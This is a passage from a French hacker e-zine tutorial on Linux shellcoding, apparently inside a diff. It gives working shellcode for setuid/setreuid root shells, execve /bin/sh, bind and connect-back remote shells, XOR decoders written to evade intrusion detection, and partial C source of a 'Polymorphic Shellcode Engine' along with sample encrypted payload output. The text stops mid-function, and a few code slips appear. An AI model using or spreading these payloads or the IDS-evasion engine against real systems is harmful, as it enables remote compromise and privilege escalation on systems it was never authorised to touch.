+	xorl %eax, %eax
+	movb $0x1, %al
+	int $0x80
+
+_call:
+	call _jmp
+	.string "miaou le chat\n"
+
+;
+;
+;-----------------------------------
+
+On appelle le CALL, ensuite l'addr de la chaîne sera "pushé" sur la stack. On peut
+donc, pour éviter cela, utiliser un JUMP, pour que rien ne soit pushé justement, 
+seulement EIP sera alors modifié. Le CALL est alors par la suite appliqué pour que
+tout fonctionne bien. Dans le [ugh!] comme on a pu le voir, les instructions.
+
+
+La suite est prévisible (objdump ...), je vous laisse faire le shellcode.
+Vous pouvez si vous le souhaitez me le mailer... :)
+
+
+
+	---[ 06 ]   Shellcoding - get the rewt (setuid / setreuid etc).
+
+Mes amis, get the root !!!!
+On va démontrer simplement en quelques lignes comment grâce à un shellcode atteindre
+le statut de root. Nous allons dans un premier temps utiliser la fonction setreuid().
+Voici comment nous pouvons illustrer cela :
+
+
+-------------------
+main() 
+{ 
+   setreuid(0,0); 
+} 
+-------------------
+
+Ceci correspond à :
+
+   \x31\xc0         // xor %eax,%eax 
+   \xb0\x46         // mov $0x46,%al 
+   \x31\xdb         // xor %ebx,%ebx 
+   \x31\xc9         // xor %ecx,%ecx 
+   \xcd\x80         // int $0x80 
+
+Ce que vous voyez là est le shellcode qui correspond à setreuid(0,0). Afin de pouvoir
+l'utiliser, on l'a associé à un shellcode /bin/sh usant le syscall execve. Nous
+allons nous y prendre comme ça :
+
+rewt.c
+----------------------------------------
+char shellcode[] =
+
+"\x31\xc0"         // xor %eax,%eax 
+"\xb0\x46"         // mov $0x46,%al 
+"\x31\xdb"         // xor %ebx,%ebx 
+"\x31\xc9"         // xor %ecx,%ecx 
+"\xcd\x80"         // int $0x80 
+"\xeb\x1d\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x31" 
+"\xd2\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xde\xff\xff\xff/bin/sh";
+
+main() 
+{ 
+   int *ret; 
+ 
+   ret = (int *)&ret + 2; 
+   (*ret) = (int)shellcode; 
+} 
+----------------------------------------
+
+Fichier que nous allons appeler rewt.c, vous le compilez comme d'habitude, on va 
+dans un premier temps lui donner les droits 4755, le chowner en root, et
+l'exécuter par la suite en user, vous aurez alors accès au root.
+
+	[bleyme@localhost Desktop]$ gcc -o rewt rewt.c
+	[bleyme@localhost Desktop]$ ls
+	rewt*  rewt.c
+
+	[bleyme@localhost Desktop]$ su
+
+	[root@localhost Desktop]# chown root rewt
+	[root@localhost Desktop]# chmod 4755 rewt
+	[root@localhost Desktop]# exit
+
+	[bleyme@localhost Desktop]$ ls
+	rewt*  rewt.c
+	
+	[bleyme@localhost Desktop]$ ./rewt
+	sh-2.05b# whoami
+	root
+	sh-2.05b#
+
+Non seulement vous avez un accès /bin/sh (heuresement) mais en plus vous pouvez atteindre
+le statut de root.
+Il n'existe pas que setreuid() pour faire celà, on utilise couramment setuid().
+Voici comment setuid est utilisé en C :
+
+setuid.c
+---------------
+int main(void)
+{
+setuid(0);
+}
+---------------
+
+Pour convertir le code en assembleur, il faut simplement placer la valeur de 0 dans
+ebx et par la suite appeler le syscall. En assembleur, celà donne :
+
+------------------------------
+.globl main
+main:
+	xorl %ebx, %ebx
+	leal 0x17(%ebx), %eax
+	int $0x80
+------------------------------
+
+Shellcodifions le :
+
+   "\x31\xdb" 		/* xorl %ebx, %ebx */
+   "\x8d\x43\x17" 	/* leal 0x17(%ebx), %eax */
+   "\xcd\x80"; 		/* int $0x80 */
+
+De meme que setreuid, on va placer celà au début de notre shellcode :
+on va utiliser 3 syscalls de suite pour le shellcode : setuid / execve
+et exit :
+
+----------------------------------------------------------------
+#include <stdio.h>
+
+char sh3llc0de[]=
+    //setuid()
+    "\x31\xc0"                  /* xor %eax,%eax    */
+    "\x31\xdb"                  /* xor %ebx,%ebx    */
+    "\xb0\x17"                  /* mov $0x17,%al    */
+    "\xcd\x80"                  /* int $0x80        */
+    
+
+    //execve() 			                   
+    "\x31\xd2"                  /* xor %edx,%edx    */
+    "\x52"                      /* push %edx	   */
+    "\x68\x2f\x2f\x73\x68"      /* push $0x68732f2f */
+    "\x68\x2f\x62\x69\x6e"      /* push $0x6e69622f */
+    "\x89\xe3"                  /* movl %esp,%ebx   */
+    "\x52"                      /* push %edx        */
+    "\x53"                      /* push %ebx        */
+    "\x89\xe1"                  /* movl %esp,%ecx   */
+    "\xb0\x0b"                  /* mov $0xb,%al     */
+    "\xcd\x80"                  /* int $0x80        */
+	
+	
+    //exit()
+    "\xb0\x01"                  /* mov $0x1,%al     */
+    "\xcd\x80";                 /* int $0x80        */
+
+
+int main()
+{
+ void (*shc)()= (void *)sh3llc0de;
+ printf("size bytes: %d.\n", sizeof(sh3llc0de)); 
+ shc();
+}
+----------------------------------------------------------------
+
+Technique toujours très connue mais ô combien efficace mes chers :
+Exemple de son utilisation :
+
+
+	[bleyme@localhost Desktop]$ gcc -o setuid setuid.c
+	[bleyme@localhost Desktop]$ ls
+	setuid*  setuid.c
+
+	[bleyme@localhost Desktop]$ su
+
+	[root@localhost Desktop]# chown root setuid
+	[root@localhost Desktop]# chmod 4755 setuid
+	[root@localhost Desktop]# exit
+
+	[bleyme@localhost Desktop]$ ls
+	setuid*  setuid.c
+	
+	[bleyme@localhost Desktop]$ ./setuid
+	size bytes: 36.
+	sh-2.05b# whoami
+	root
+	sh-2.05b#
+
+Wahou, très connu il faut l'avouer. Mais il existe encore de nombreuses méthodes. 
+Pour finir cette partie, on va conclure en utilisant setuid() et setgid() :
+
+uid.c
+-----------------------------------
+#include <sys/types.h>
+#include <unistd.h>
+#include <stdio.h>
+
+int main (int argc, char **argv ) 
+{
+        setuid(0);
+        setgid(0);
+        execv("/bin/sh",argv);
+        return 0 ;
+}
+-----------------------------------
+
+
+	[bleyme@localhost Desktop]$ gcc -o uid uid.c
+	[bleyme@localhost Desktop]$ ls
+	uid*  uid.c
+
+	[bleyme@localhost Desktop]$ su
+
+	[root@localhost Desktop]# chown root uid
+	[root@localhost Desktop]# chmod 4755 uid
+	[root@localhost Desktop]# exit
+
+	[bleyme@localhost Desktop]$ ./uid
+	sh-2.05b# whoami
+	root
+
+
+
+	---[ 07 ]   Shellcoding - asm coding.
+
+comme le titre l'indique, nous traiterons ici du coding asm, pour ensuite faire la
+conversion en shellcode, si vous ne connaissez pas du tout l'asm, revenez au moyen-âge 
+ou aller sur : www.linuxassembly.org.
+
+Important :
+
+Sous linux, lors de la programmation d'un shellcode, le codeur se doit d'utiliser
+
+ - eax
+ - ebx
+ - ecx
+ - edx
+ - edi
+ - esi
+
+pour passer des arguments aux syscalls. Ainsi tout se fera très simplement.
+
+On va commencer par le plus basique possible, un helloworld en ASM tout basique,
+alors directement ecrire une source ASM sous nasm, et nous allons par la suite
+en faire un shellcode : 
+
+;----------------------------------
+;
+; helloworld asm shellcode (super)
+; hw.asm
+; made by bleyme
+;
+segment .text
+	global	_start
+_start:
+	mov	eax, 4
+	mov	ebx, 1
+	mov	ecx, msg
+	mov	edx, length
+	int	0x80
+gas:
+        mov     ax, 5307h
+        mov     cx, 0002h
+        mov     bx, 0001h
+        int     15h
+        mov	    eax, 1
+        int     0x80
+
+segment	.data
+message	db	"Salut ma poule", 0x0a
+length	equ	$ - msg
+
+
+	[bleyme@localhost Desktop]$ nasm -felf hw.asm
+	[bleyme@localhost Desktop]$ ld -o hw hw.o
+
+	[bleyme@localhost Desktop]$ ./hw
+	Salut ma poule
+	Segmentation fault
+
+	[bleyme@localhost Desktop]$objdump -d hw
+	hw:     file format elf32-i386
+	Disassembly of section .text:
+	08048080 <_start>:
+	8048080:       b8 04 00 00 00          mov    $0x4,%eax
+	8048085:       bb 01 00 00 00          mov    $0x1,%ebx
+	804808a:       b9 ac 90 04 08          mov    $0x80490ac,%ecx
+	804808f:       ba 0f 00 00 00          mov    $0xf,%edx
+	8048094:       cd 80                   int    $0x80
+	08048096 <gas>:
+	8048096:       66 b8 07 53             mov    $0x5307,%ax
+	804809a:       66 b9 02 00             mov    $0x2,%cx
+	804809e:       66 bb 01 00             mov    $0x1,%bx
+	80480a2:       cd 15                   int    $0x15
+	80480a4:       b8 01 00 00 00          mov    $0x1,%eax
+	80480a9:       cd 80                   int    $0x80
+
+	[bleyme@localhost Desktop]$
+
+Ce shellcode, envahi de nullbyte nous donnera alors en "l'implantant" en C 
+ceci :
+
+	[bleyme@localhost Desktop]$ cat hwsh.c
+
+	unsigned char shellcode[] = 
+
+  	       "\xb8\x04\x00\x00\x00"
+  	       "\xbb\x01\x00\x00\x00"
+  	       "\xb9\xac\x90\x04\x08"
+  	       "\xba\x0f\x00\x00\x00"
+  	       "\xcd\x80"
+  	       "\x66\xb8\x07\x53"
+  	       "\x66\xb9\x02\x00"
+  	       "\x66\xbb\x01\x00"
+  	       "\xcd\x15"
+  	       "\xb8\x01\x00\x00\x00"
+  	       "\xcd\x80";
+
+	int main()
+	{
+	    void (*f)();
+	    f = (void *) shellcode;
+	    printf("%d\n", strlen(shellcode));
+	    f();
+	}
+
+	[bleyme@localhost Desktop]$ gcc -o hwsh hwsh.c
+
+	[bleyme@localhost Desktop]$ ./hwsh
+	Salut ma poule
+	Segmentation fault
+
+
+
+Passons à un execve() shellcode :
+
+;----------------------------------
+;
+; execve /bin/sh asm shellcode 
+; sh2.asm
+;
+
+global ca
+global fin
+segment .text
+
+debut:
+       	jmp short jump
+ca:
+       	pop esi
+       	xor eax, eax
+       	mov ebx, esi
+       	dec byte [ebx + 7]
+       	mov [ebx + 8], esi
+       	mov [ebx + 12], eax
+       	mov al, 11
+       	lea ecx, [esi + 8]
+       	lea edx, [esi + 12]
+       	int 80h
+jump:
+       	call ca
+       	db '/bin/sh',1
+fin:
+
+;----------------------------------
+
+	[bleyme@localhost Desktop]$ nasm -f elf sh2.asm
+	[bleyme@localhost Desktop]$ ld -o sh2 sh2.o
+
+	[bleyme@localhost Desktop]$ objdump -d sh2
+	sh2:     file format elf32-i386
+	Disassembly of section .text:
+	08048080 <debut>:
+	8048080:       eb 18                   jmp    804809a <jump>
+        08048082 <ca>:
+        8048082:       5e                      pop    %esi
+        8048083:       31 c0                   xor    %eax,%eax
+        8048085:       89 f3                   mov    %esi,%ebx
+        8048087:       fe 4b 07                decb   0x7(%ebx)
+        804808a:       89 73 08                mov    %esi,0x8(%ebx)
+        804808d:       89 43 0c                mov    %eax,0xc(%ebx)
+        8048090:       b0 0b                   mov    $0xb,%al
+        8048092:       8d 4e 08                lea    0x8(%esi),%ecx
+        8048095:       8d 56 0c                lea    0xc(%esi),%edx
+        8048098:       cd 80                   int    $0x80
+        0804809a <jump>:
+        804809a:       e8 e3 ff ff ff          call   8048082 <ca>
+        804809f:       2f                      das
+        80480a0:       62 69 6e                bound  %ebp,0x6e(%ecx)
+        80480a3:       2f                      das
+        80480a4:       73 68                   jae    804810e <fin+0x67>
+        80480a6:       01                      .byte 0x1
+
+
+sh2tst.c
+----------------------------------
+unsigned char shellcode[] =
+        "\xeb\x18"
+        "\x5e"
+        "\x31\xc0"
+        "\x89\xf3"
+        "\xfe\x4b\x07"
+        "\x89\x73\x08"
+        "\x89\x43\x0c"
+        "\xb0\x0b"
+        "\x8d\x4e\x08"
+        "\x8d\x56\x0c"
+        "\xcd\x80"
+        "\xe8\xe3\xff\xff\xff"
+        "\x2f"
+        "\x62\x69\x6e"
+        "\x2f"
+        "\x73\x68"
+        "\x01";
+int main()
+{
+  void (*f)();
+  f = (void *) shellcode;
+  printf("size: %d bytes.\n", strlen(shellcode));
+  f();
+}
+----------------------------------
+
+	[bleyme@localhost Desktop]$ gcc -o sh2tst sh2tst.c
+	shhh.c:26:2: warning: no newline at end of file
+
+	[bleyme@localhost Desktop]$ ./sh2tst
+	size: 39 bytes
+
+	sh-2.05b$ echo wow.
+	wow.
+
+
+
+
+	 -----------------------
+	|  REMOTE ASM SHELLCODE |
+	 -----------------------
+
+- bind.asm
+- connectback.asm
+
+Voici leur code asm :
+
+
+
+;
+; bind.asm for Polymorphic Shellcode Engine project
+; 
+; Made by eee
+; 
+; Started on  Thu Apr 14 00:29:44 2005 eee
+; Last update Sat Apr 16 15:20:43 2005 eee
+;
+
+BITS 32
+
+;socket(family, type, proto)
+	xor 	eax, eax
+	cdq
+	mov      al, 102
+  	push 	edx		; 0=IP
+  	inc  	edx
+  	push 	edx		; 1=SOCK_STREAM
+ 	inc  	edx
+  	push 	edx		; 2=AF_INET
+  
+  	mov  	ecx, esp
+  	push 	byte 1
+	pop	ebx		; 1 -> socket
+  	int  	0x80
+
+
+
+;bind(socket, addr, lenng)
+bind: 
+  	mov     edi, eax
+        cdq
+	push    edx
+        push    word 0xB315	; port 0x15B3 = 5555
+        inc     ebx		; 
+        push    bx		; (0002 = AF_INET)
+        mov     ecx, esp	; ecx = offset sockaddr struct
+        push    byte 16		; len
+        push    ecx		; push offset sockaddr struct
+        push    eax		; handle socket
+        mov 	ecx, esp
+        mov 	al, 102
+        int 	0x80
+  
+
+
+;listen(socket, backlog)
+listen:
+	mov	 al, 102
+	mov	 bl, 4		; 4 -> listen
+	int	0x80
+
+
+;accept(socket, addr, len)
+accept:
+	push 	eax
+	push 	edi
+	mov 	ecx, esp
+	inc  	ebx		; 5 -> accept
+	mov	 al, 102
+	int 	0x80
+
+dup2:
+        xor     ecx, ecx
+        mov      cl, 3
+	xchg	ebx, eax	; fd
+boucle:
+        dec     ecx
+        mov     al, 63
+        int     0x80
+        test	ecx, ecx
+	jne 	boucle
+        
+
+;execve /bin/sh
+exec:
+	xor	eax,eax
+	mov     al, 11            ;execve
+  	push	ecx
+	push 	"//sh"
+ 	push 	"/bin"
+ 	mov  	ebx, esp
+  	push 	ecx
+  	push 	ebx
+  	mov  	ecx, esp
+  	int  	0x80
+
+
+
+
+
+
+Pour le connectback.asm :
+
+;
+; connect.asm for Polymorphic Shellcode Engine project
+; 
+; Made by eee
+; 
+; Started on  Thu Apr 14 00:29:44 2005 eee
+; Last update Sat Apr 16 15:17:40 2005 eee
+;	
+
+BITS 32
+
+;_start:
+        xor     eax, eax
+        cdq
+        mov      al, 102                ; socket
+        xor     ebx, ebx
+        push    ebx                     ; IPPROTO_TCP (0)
+        inc     ebx                     ; 1 -> socket
+        push    ebx                     ; SOCKET_STREAM == 1
+        inc 	ebx
+	push    ebx                     ; AF_INET = 2
+	dec	ebx
+        mov     ecx, esp
+        int     0x80
+
+;connect:
+        push    0x0100007F              ; ip adresss
+        push    word 0xB315
+	inc	edx
+	inc	edx
+	push	word dx
+	xor	edx, edx
+        mov     esi, esp
+        mov	dl, 16                      ; bytes long adress
+	push	edx
+        push    esi                     ; sockaddr_in struc
+        push    eax                     ; fd
+        mov	 al, 102
+        inc     ebx
+        inc     ebx                     ; 3 -> connect
+        mov     ecx, esp
+        int     0x80
+
+;dup2:
+	xor 	ecx, ecx
+	mov	 cl, 3
+	pop	ebx			; fd
+boucle:
+	dec	ecx
+	mov	al, 63
+	int	0x80
+	jg	boucle
+
+
+;execve	/bin /sh
+     	xor	edx, edx 
+	mov     al, 11			;execve
+        push	edx
+	push    "//sh"
+        push    "/bin"
+        mov     ebx, esp
+        push    ecx
+        push    ebx
+        mov     ecx, esp
+        int     0x80
+
+
+
+	---[ 08 ]   Shellcoding - polymorphic
+
+Le polymorphisme en matière de shellcode se fait de plus en plus souvent, celà n'a rien
+d'innovant, à part peut être les techniques employées... Pour voir ça plus en détail, on
+va faire un petit plan :
+
+  - wtf ?
+  - Le schéma
+  - Le décodeur
+  - L'encodeur
+
+
+ ------------------
+|       wtf        |
+ ------------------
+
+On parle de polymorphisme lorsqu'on a "plusieurs formes", pourquoi me direz-vous, la raison
+est plutôt simple, les IDS font bien leur travail. En général, on encode le shellcode et 
+on place un décodeur devant le shellcode. Dès que cela est fait, le décodeur a pour fonction
+de décoder le shellcode. Le payload est alors polymorphisé, et l'IDS ne nous détectera pas.
+
+ ------------------
+|      schéma      |
+ ------------------
+
+       ------------------          ------------------          ------------------
+      | Shellcode normal |        |                  |        |                  |
+      |	execve / bind /  | -----> |     Encoder      | <----- |  Clef aléatoire  |
+      | connect-back etc |        |                  |        |                  |
+       ------------------          ------------------          ------------------
+                                            |
+                                            |
+                                            |                                            
+                                   ------------------
+                                  | Shellcode        |
+                                  | encode par une   |
+                                  | clef aleatoire   |
+                                   ------------------
+
+
+
+                                                    Ainsi arrive le decodeur :
+
+                                                                             ------------------ 
+                                                                            |                  |
+                                                                            |     Decodeur     | <------<----
+                                                                            |                  |             |
+                                                                             ------------------              |
+                                                                                      |                      |
+			 -------------------           				      |                 -----------
+			|  Shellcode normal |					      |                |           |
+                        |  execve / bind /  | <----------<-----------<--------<-------      	       |   Clef    |
+			|  connect-back etc |							       |           |
+			 -------------------           						        -----------
+
+
+On a tout d'abord un shellcode normal type :  \xeb\x1f\x5e\x89\x76\x08\x31\xc0
+\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31
+\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"; Il va vers l'encodeur (nous 
+expliquerons qu'est-ce que c'est et comment doit t-il marcher) qui lui génére le
+shellcode grâce à une clef aléatoire, le shellcode est alors encodé. Viens alors
+le décodeur qui lui a pour fonction de décoder le shellcode (sérieux ?), la clef
+n'est bien sur pas étrangère au "decryptage" de redevient donc normal.
+
+ ------------------
+|     decoder      |
+ ------------------
+                                                                          
+Un "decoder type" doit régler la clef du shellcode décodeur et par la suite crypter
+le shellcode. Il faudra par la suite assembler les deux shellcodes. Le decodeur
+devra alors faire un XOR. En revanche, le mieux est de ne pas faire un décodeur type,
+tout simplement parce que si le décodeur du shellcode qui a été encodé n'a qu'une seule
+forme, il ne serait pas correct de parler de polymorphisme, ca serait la honte pour le
+shellcode, être polymorphe mais se faire détecter par un IDS :p. Ceci est très bien
+expliqué dans la partie PSE de l'article. 
+
+Voici le squelette d'un decoder :
+
+;------------------------------------------
+BITS32
+	jmp	encrypt
+decrypt:
+	pop	%esi
+	xorl	[LA CLEF], [OFFSET](%esi)
+	jmp	sh3llc0de
+
+encrypt:
+	call	decrypt
+
+sh3llc0de:	
+	shellcode
+;------------------------------------------
+
+
+Finalement, un decodeur pourrait prendre la forme de :
+
+;------------------------------------------
+;
+; shellcode decoding example
+;
+
+BITS32
+
+jmp short va
+suiv:
+	pop   		esi
+	xor		ecx, ecx
+	mov		cl, 0
+cod:
+	sub byte        [esi + ecx - 1],0
+	dec		cl
+	jnz change
+	jmp short fin
+va:
+	call suiv
+
+fin:
+
+;------------------------------------------
+
+
+ ------------------
+|     encodeur     |
+ ------------------
+
+L'encodeur lui, fonctionne totalement différemment, logique. Son but, lui, est 
+d'encoder le shellcode avec une clef.
+
+
+
+	---[ 09 ]   coding - PSE - Polymorphic Shellcode Engine.
+
+
+
+1 - PSE : Fonctionnement
+------------------------
+
+PSE génére un code asm permettant de decrypter le shellcode
+voulu, précédemment crypté avec une clé aléatoire.
+
+Le decrypteur est généré de façon 'aléatoire' : 
+  - Inversion de l'ordre certaines mnemoniques.
+  - Utilisation de mnemoniques différentes pour 'faire la même chose'.
+  - Injection de junk code de facon aleatoire.
+
+Le cryptage du shellcode se fait grâce à un xor avec une clé de 8 bits.
+La valeur de la clé est incrémentée pour chaque octet.
+La clé est comprise entre 1(inclus) et 255(inclus). La clé est
+choisie de facon à ce que le shellcode résultat ne comporte aucun 00.
+Le shellcode de base peut contenir des 00, le cryptage les transformera.
+
+PSE permet aussi de patcher les shellcodes pour modifier leur
+port(pour les bindshell) ou leur port/ip (pour les connectback).
+Tout cela bien sûr sans que cela génére de 00 dans le shellcode final. 
+
+Le junk code est inséré en prenant de façon aléatoire des instructions
+dans 2 tableaus.
+Le tableau JUNK1 contient des instructions codées sur 1 octets et JUNK2 
+des instructions codées sur 2 octets
+
+
+
+
+2 - A quoi ressemble le resultat final
+--------------------------------------
+
+
+Calcul du delta offset:
+-----------------------
+
+  JMP   SHORT @1
+@2:
+  POP   EBP
+  JUNK1
+@1:
+  CALL  @2
+  JUNK1
+  JUNK2
+
+
+Cette partie est la moins 'changeante' des 3. Les changemente
+se font uniquement grâce au junk code.
+
+
+
+Initialisation de la boucle de decryptage:
+------------------------------------------
+
+  ADD EBP, xx
+  MOV ESI, EBP
+  MOV EDI, EBP
+  XOR ECX, ECX
+  MOV  CL, key
+  MOV reg, size
+
+l'ordre de ces instructions est génèré de façon aleatoire,
+la seule condition est de metre le ADD EBP, xx avant le
+init de esi ou edi.
+Key est une cle aléatoire génère de façon aléatoire mais
+de façon à ne pas générer de 00.
+Reg peut être soit ebx soit edx. Size est la size du shellcode.
+Ensuite un junkcode est inséré n'importe où de façon aléatoire
+entre ces 5 lignes.
+
+
+
+
+Boucle de decryptage:
+---------------------
+
+  CLD
+     LODSB
+     JUNK2
+  ou
+     MOV AL, [ESI]
+     INC ESI
+  XOR AL, reg
+     MOV [EDI], AL
+     INC EDI
+  ou
+     STOSB
+     JUNK2
+
+
+
+Shellcode :
+-----------
+
+Shellcode patchee et cryptee precedament. 
+
+
+
+
+Au final la boucle de decryptage fait 51 octets.
+
+
+
+
+
+3 - Test
+--------
+
+emp@neptune:~/code/c/pse $ ./pse -h
+
+     @@@
+    @. .@
+    @\=/@
+    .- -.
+   /(. .)\
+   \ ).( /     PSE : The most er0tic Polymorphic Shellcode Engine
+   '( v )`     version 0.01b
+     \|/
+     (|)
+     '-`
+
+./pse [shellcode number] [port] [ip]
+
+shellcode list : 
+0 - linux : Bind shell.
+1 - linux : Connect back.
+2 - pas dispo
+3 - pas dispo
+
+
+emp@neptune:~/code/c/pse $ ./pse 0 1234
+
+     @@@
+    @. .@
+    @\=/@
+    .- -.
+   /(. .)\
+   \ ).( /     PSE : The most er0tic Polymorphic Shellcode Engine
+   '( v )`     version 0.01b
+     \|/
+     (|)
+     '-`
+
+[-] Recherche d'une cle pour -> linux : Bind shell.
+key = 118
+
+[-] Generation : calcul delta offset :
+JMP SHORT XX
+POP EBP
+CLC
+JMP SHORT XX
+PUSH EBX
+POP EBX
+CALL XXXXXXXX
+INC EAX
+DEC ECX
+INC ECX
+
+[-] Generation : initialisation de la boucle :
+XOR reg, reg
+MOV reg8, 'key'
+ADD EBP, xx
+CMC
+MOV ESI, EBP
+DEC EBX
+INC EBX
+PUSH ECX
+POP ECX
+XOR ECX, ECX
+MOV CL, 'size'
+MOV EDI, EBP
+XCHG ECX, ECX
+size = 92, reg = EBX, key = 118
+
+[-] Generation : boucle :
+CLD
+LODSB
+XCHG EBX, EBX
+XOR AL, BL
+INC BL
+MOV [EDI], AL
+INC EDI
+LOOP
+
+Sortie binaire dans : shellcode.bin
+Sortie texte dans : shellcode.c
+
+emp@neptune:~/code/c/pse $ cat shellcode.c 
+
+char shellcode[]=
+"\xeb\x06\x5d\xf8\xeb\x07\x53\x5b\xe8\xf5\xff\xff\xff\x49\x41"
+"\x40\x31\xdb\xb3\x76\x83\xc5\x26\x26\x89\xee\x4b\x43\x51\x59"
+"\x31\xc9\xb1\x5c\x89\xef\x87\xc9\xfc\xac\x87\xdb\x30\xd8\xfe"
+"\xc3\x88\x07\x47\xe2\xf4"
+"\x47\xb7\xe1\xc9\x1c\x29\x3e\x2f\x3c\x2d\x09\x60\xe8\x82\xdf"
+"\x48\x06\x0e\x4f\x10\xd8\xed\xe4\x89\x5c\xcc\xf6\xc2\x1b\x72"
+"\xfe\x85\xc7\xc7\x11\x78\x2a\xfd\x51\x1d\x2e\xf9\x13\xa5\x6f"
+"\x23\xf4\xf2\x2f\x46\xeb\x19\xcc\x66\x2c\x9c\x67\x1e\xb3\x22"
+"\xfb\x03\x8b\x78\x36\x32\x71\xcc\x4d\x8a\x7c\x0d\xb5\xee\xa8"
+"\xee\xed\xb0\xac\xad\xe9\xa5\xa1\xa7\x43\x28\x9d\x9e\x47\x2e"
+"\x1d\x51";
+
+emp@neptune:~/code/c/pse $ cd test/
+emp@neptune:~/code/c/pse/test $ ./test.sh 
+
+Hello dude, welcome to my (so er0tic) test script for PSE
+
+The shellcode is in data segment.
+If you have non-executable user pages protection disable it for the test.
+
+Compiling :
+
+Ok, running the shellcode ->
+
+
+
+Dans un autre shell :
+
+emp@neptune:~ $ nc localhost 1234
+uname -a 
+Linux neptune 2.6.10-5-386 #1 Tue Apr 5 12:12:40 UTC 2005 i686 GNU/Linux
+ls  
+shellcode
+shellcode.c
+test.sh
+
+
+
+4 - NOTE
+--------
+
+Ce code a été réalisé vite fait durant le peu de temps libre que j'ai,
+soyez indulgents quant à sa qualité.
+Je ne retoucherai certainement pas ce code, son seul but est d'illustrer 
+un article sur les shellcodes polymorphe pour le magazine n0name.
+
+
+Si vous voulez discuter du code ou autre : irc.freenode.org   /query emp_
+
+
+Dans cette partie, nous étudierons un moteur polymorphe crée exprès pour l'emag :
+The most er0tic Polymorphic Shellcode Engine.
+Il génère un decrypteur different et crypte le shellcode par la suite. Voici son
+code qui se repartit en 9 parties.
+
+#########################################
+#                                       #
+#          build_delta.c                #
+#                                       #
+#########################################
+
+/*
+** build_delta.c for Polymorphic Shellcode Engine project
+** 
+** Made by eee
+** 
+** Started on  Tue Apr 12 15:55:24 2005 eee
+** Last update Tue Apr 12 22:07:00 2005 eee
+*/
+
+#include <stdlib.h>
+#include <string.h>
+#include <stdio.h>
+#include <pse.h>
+
+extern t_tab	gl_delta[];
+extern t_tab	gl_junk1[];
+extern t_tab	gl_junk2[];
+
+void	build_delta(t_env *env)
+{
+  char	*save;
+  int	rnd;
+
+  save = env->decrypt;
+
+  rnd = random() % TAB_JUNK1;
+  gl_delta[0].op += ((gl_junk1[rnd].op) << 24);
+  memcpy(env->decrypt, &gl_delta[0].op, sizeof(int));
+  env->decrypt += sizeof(int);
+  printf("%s\n%s\n",gl_delta[0].desc, gl_junk1[rnd].desc);
+
+  rnd = random() % TAB_JUNK2;
+  gl_delta[1].op += ((gl_junk2[rnd].op) << 16);
+  memcpy(env->decrypt, &gl_delta[1].op, sizeof(int));
+  env->decrypt += sizeof(int);
+  printf("%s\n%s\n",gl_delta[1].desc, gl_junk2[rnd].desc);
+
+  memcpy(env->decrypt, &gl_delta[2].op, sizeof(int));
+  env->decrypt += sizeof(int);
+  printf("%s\n",gl_delta[2].desc);
+
+  rnd = random() % TAB_JUNK1;
+  gl_delta[3].op += ((gl_junk1[rnd].op) << 24);
+  printf("%s\n", gl_junk1[rnd].desc);
+
+  rnd = random() % TAB_JUNK2;
+  gl_delta[3].op += ((gl_junk2[rnd].op) << 8);
+  printf("%s\n", gl_junk2[rnd].desc);
+
+  memcpy(env->decrypt, &gl_delta[3].op, sizeof(int));
+  env->decrypt += sizeof(int);
+}
+
+
+
+
+
+#########################################
+#                                       #
+#           build_init.c                #
+#                                       #
+#########################################
+
+/*
+** build_init.c for Polymorphic Shellcode Engine project
+** 
+** Made by eee
+** 
+** Started on  Tue Apr 12 15:56:24 2005 eee
+** Last update Fri Apr 15 00:22:19 2005 eee
+*/
+
+#include <string.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <pse.h>
+
+extern t_tab	gl_init[];
+extern t_tab	gl_junk1[];
+extern t_tab	gl_junk2[];
+
+void	init_junk(t_env *env, int *junk)
+{
+  int	rnd;
+
+  rnd = (random() % TAB_JUNK2);
+  memcpy(env->decrypt, &gl_junk2[rnd].op, 2);
+  printf("%s\n", gl_junk2[rnd].desc);
+  *junk = 1;
+  env->decrypt += 2;
+}
+
+int	get_valid_rnd(t_env *env, int init)
+{
+  env->rnd = random() % TAB_INIT;
+  for (; (init & (1 << env->rnd)) != 0 ||
+	 env->rnd == TAB_INIT; env->rnd++)
+    {
+      if (env->rnd == TAB_INIT)
+	env->rnd = -1;
+    }
+  return (init);
+}
+
+void	patch_init_key(t_env *env)
+{
+  if (env->reg == EBX)
+    {
+      gl_init[env->rnd].op += (XOR_EBX << 8);
+      gl_init[env->rnd].op += (MOV_BL << 16);
+    }
+  else
+    {
+      gl_init[env->rnd].op += (XOR_EDX << 8);
+      gl_init[env->rnd].op += (MOV_DL << 16);
+    }
+  gl_init[env->rnd].op += (env->key << 24);
+  printf("%s\n", gl_init[env->rnd].desc);
+}
+
+void		patch_esi_edi(t_env *env)
+{
+  int		tmp;
+
+  if (env->ebp == 0)
+    {
+      env->ebp++;
+      printf("%s\n", gl_init[TAB_INIT].desc);
+      gl_init[TAB_INIT].op += (OFFSET << 16);
+      tmp = random() % TAB_JUNK1;
+      gl_init[TAB_INIT].op += (OFFSET << 24);
+      printf("%s\n", gl_junk1[tmp].desc);
+      memcpy(env->decrypt, &gl_init[TAB_INIT].op, sizeof(int));
+      env->decrypt += sizeof(int);
+    }
+  printf("%s\n", gl_init[env->rnd].desc);
+  tmp = random() % TAB_JUNK2;
+  gl_init[env->rnd].op += (gl_junk2[tmp].op << 16);
+  printf("%s\n", gl_junk2[tmp].desc);
+}
+
+void	patch_tab(t_env *env)
+{
+
+  if (env->rnd == INIT_ESI || env->rnd == INIT_EDI)
+    patch_esi_edi(env);
+  else if (env->rnd == INIT_KEY)
+    patch_init_key(env);
+  else if (env->rnd == INIT_SIZE)
+    {
+      gl_init[env->rnd].op += (env->size << 24);
+      printf("%s\n", gl_init[env->rnd].desc);
+    }
+}
+
+void		build_init(t_env *env)
+{
+  int		i;
+  int		init;
+  int		junk;
+
+  env->reg = random() % 2;
+  env->ebp = 0;
+  for (init = 0, junk = 0, i = 0; i < TAB_INIT; i++)
+    {
+      init = get_valid_rnd(env, init);
+      patch_tab(env);
+      memcpy(env->decrypt, &gl_init[env->rnd].op, sizeof(int));
+      init += (1 << env->rnd);
+      env->decrypt += sizeof(int);
